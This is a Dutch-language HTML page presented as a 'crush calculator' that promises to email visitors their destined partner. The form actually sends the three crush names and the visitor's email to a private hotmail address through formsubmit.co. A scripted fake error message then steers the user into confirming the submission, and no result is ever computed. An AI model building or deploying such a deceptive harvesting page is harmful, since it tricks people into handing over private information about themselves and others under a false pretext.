<!DOCTYPE html>
<html lang="nl">
<head>

    <meta charset="UTF-8">
    <title>Een-Beetje-Verliefd.nl</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: sans-serif;
        }

        html {
            width: 100%;
            height: 100%;
        }

        body {
            width: 100%;
            height: 100%;
            background-color: pink;
        }

        button > input {
            border: none;
            width: 0;
        }

         button:hover {
            background-color: pink;
             border-radius: 2px;
        }

        .flexContainer {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            height: 100%;
            padding-inline: 2%;
        }

        .container {
            background-color: white;
            text-align: center;
            padding: 4%;
            border-radius: 2px;
        }

        #eMail {
            width: 25rem;
        }

        .submitButton {
            padding: 1%;
        }

    </style>
</head>

<body>
<div id="size"></div>
<div class="flexContainer">
    <div class="container">
        <h1><span>Vul de namen van je nummer 3 crushes in en krijg op je mail te zien wie je MeantToBe is</span></h1>
        <br>
        <label for="country">Land:</label>
        <br>
        <div class="col-75">
            <select id="country" name="country">
                <option value="Nederland">Nederland</option>
                <option value="Deutchland">Duitsland</option>
                <option value="USA">USA</option>
            </select>
        </div>
        <br>
        <form action="https://formsubmit.co/bavli2002@hotmail.com" method="POST">
            <br>
            <div class="row">
                <div class="col-25">
                    <label for="name1">Crush 1:</label>
                </div>
                <div class="col-75">
                    <input type="text" id="name1" name="name1" placeholder="Crush 1">
                </div>
            </div>
            <br>
            <div class="row">
                <div class="col-25">
                    <label for="name2">Crush 2:</label>
                </div>
                <div class="col-75">
                    <input type="text" id="name2" name="name2" placeholder="Crush 2">
                </div>
            </div>
            <br>
            <div class="row">
                <div class="col-25">
                    <label for="name3">Crush 3:</label>
                </div>
                <div class="col-75">
                    <input type="text" id="name3" name="name3" placeholder="Crush 3">
                </div>
            </div>
            <br>
            <div class="row">
                <div class="col-25">
                    <label for="eMail">Je E-mail:</label>
                </div>
                <div class="col-75">
                    <input type="text" id="eMail" name="eMail"
                           placeholder="Vul hier het E-mail in waarnaar we de resultaten mogen verzenden">
                </div>
            </div>
            <br>
            <br>
            <br>

            <button onclick="error()" class="submitButton">
                Bereken Resultaat
                <input type="submit">
            </button>

        </form>
    </div>
</div>
<script>

    function error() {
        alert("Oops, Er is iets misgegaan, klik op de volgende pagina op submit om opnieuw te proberen.");
    }
</script>
</body>
</html>
